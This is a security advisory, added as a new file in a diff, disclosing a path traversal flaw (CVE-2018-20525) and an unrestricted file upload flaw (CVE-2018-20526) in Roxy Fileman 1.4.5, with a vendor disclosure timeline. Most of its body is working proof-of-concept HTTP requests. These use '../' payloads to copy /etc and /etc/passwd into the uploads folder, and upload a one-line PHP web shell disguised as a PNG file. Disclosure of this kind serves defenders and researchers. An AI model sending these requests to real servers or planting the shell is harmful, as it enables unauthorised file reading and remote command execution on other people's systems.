@@ -1,0 +1,177 @@
+======================================================================
+Exploit Title:: Multiple Vulnerabilities
+Software: Roxy Fileman
+Version: 1.4.5
+Vendor Homepage: http://www.roxyfileman.com/
+Software Link: http://www.roxyfileman.com/download.php?f=1.4.5-php
+CVE number: CVE-2018-20525, CVE-2018-20526
+Found: 2018-12-07
+Tested on: PHP 7.0, Ubuntu 16.04 LTS
+Author: Pongtorn Angsuchotmetee, Vittawat Masaree
+SnoopBees Lab
+https://www.snoopbees.com
+=======================================================================
+Description
+===============================================================
+Roxy Fileman is free open source file browser for .NET and PHP, ready for
+use with CKEditor and TinyMCE WYSIWYG html editors. It could be easily
+integrated into a CMS or any other web application. Fileman is based on
+JQuery and JQueryUI libraries and it's compatible with all modern browsers
+- Internet Explorer, Firefox, Google Chrome, Safary and Opera.
+
+Roxy Fileman is designed to be as flexible as possible. The client
+interface is completely separated from the server-side logic and scripts,
+thus can be used with any server programming language - PHP, ASP .NET,
+Python, Cold Fusion etc. All data exchanged including configuration and
+language files is in light weight JSON format. Great performance - all data
+from the server is loaded using Ajax without page reloading. Fileman has
+ready to use distributions for PHP and .NET. All client-server
+communications and configuration files are in JSON format and are language
+independent. See custom server side scripts.
+Ref: http://www.roxyfileman.com/
+
+Vulnerability
+==================================
+
+   1. Path Traversal (CVE-2018-20525)
+   2. Unrestricted File Upload (CVE-2018-20526)
+
+==================================
+
+Proof of Concept
+===========================
+1) Path Traversal (CVE-2018-20525)
+==================================
+The vulnerability affected file “copydir.php", “copyfile.php",
+“fileslist.php". It is we can manipulating variables that reference files
+with “dot-dot-slash (../)”  to access arbitrary files and directories
+access on file system. After copied the system file will appear on Roxy
+file manager “http://[IP-Address]/fileman/Uploads".
+
+#################################################
+----------------------------------------------------------------------------------
+
+1.1. copydir.php
+
+POST /fileman/php/copydir.php HTTP/1.1
+Host: 10.10.10.190
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.190/fileman/index.html
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 78
+Connection: close
+Cookie: PHPSESSID=m48hnq7i6f83tdb38kaagfn4af;
+roxyld=%2Ffileman%2FUploads%2FImages; roxyview=list
+
+d=%2Ffileman%2FUploads%2F*/../../../../../../../../etc/*&n=%2Ffileman%2FUploads/
+
+
+----------------------------------------------------------------------------------
+
+
+1.2. copyfile.php
+
+POST /fileman/php/copyfile.php HTTP/1.1
+Host: 10.10.10.190
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.190/fileman/index.html
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 66
+Connection: close
+Cookie: PHPSESSID=m48hnq7i6f83tdb38kaagfn4af;
+roxyld=%2Ffileman%2FUploads%2FImages; roxyview=list
+
+f=%2Ffileman%2FUploads%2F*/../../../../../../../../etc/passwd*&type=
+----------------------------------------------------------------------------------
+
+
+1.3. filelist.php
+
+POST /fileman/php/fileslist.php HTTP/1.1
+Host: 10.10.10.190
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.190/fileman/index.html
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 65
+Connection: close
+Cookie: PHPSESSID=m48hnq7i6f83tdb38kaagfn4af;
+roxyld=%2Ffileman%2FUploads%2FImages; roxyview=list
+
+d=%2Ffileman%2FUploads%2FImages*/../../../../../../../../etc*&type=
+
+##############################################################
+============================
+2) Unrestricted File Upload (CVE-2018-20526)
+==================================
+The vulnerability affected file upload.php and in the condition that the
+php.ini file need have add the “*AddHandler php7-script .php*”. And now we
+can upload the shell code file to the server by double extension such
+as *shellcode.php.png
+*
+
+--------------------------------------------------------------------------------------------------------------------
+
+POST /fileman/php/upload.php HTTP/1.1
+Host: 10.10.10.190
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.190/fileman/index.html
+Content-Type: multipart/form-data;
+boundary=---------------------------67141620012509
+Content-Length: 547
+Connection: close
+Cookie: PHPSESSID=m48hnq7i6f83tdb38kaagfn4af; roxyld=%2Ffileman%2FUploads;
+roxyview=list
+
+-----------------------------67141620012509
+Content-Disposition: form-data; name="action"
+
+upload
+-----------------------------67141620012509
+Content-Disposition: form-data; name="method"
+
+ajax
+-----------------------------67141620012509
+Content-Disposition: form-data; name="d"
+
+/fileman/Uploads
+-----------------------------67141620012509
+Content-Disposition: form-data; name="files[]"; filename="*phpshell.php.png*"
+
+Content-Type: image/png
+
+*<?php system($_GET[cmd]); ?> *
+-----------------------------67141620012509--
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Timeline
+==================================
+2018-12-07: Discovered the bug
+2018-12-11: Reported to vendor (The vendor is unresponsive)
+2018-12-19: Reported to vendor (The vendor is unresponsive)
+2018-12-27: Request CVE
+2019-01-03: Advisory published
+
+Discovered By:
+=====================
+Pongtorn Angsuchotmetee, Vittawat Masaree
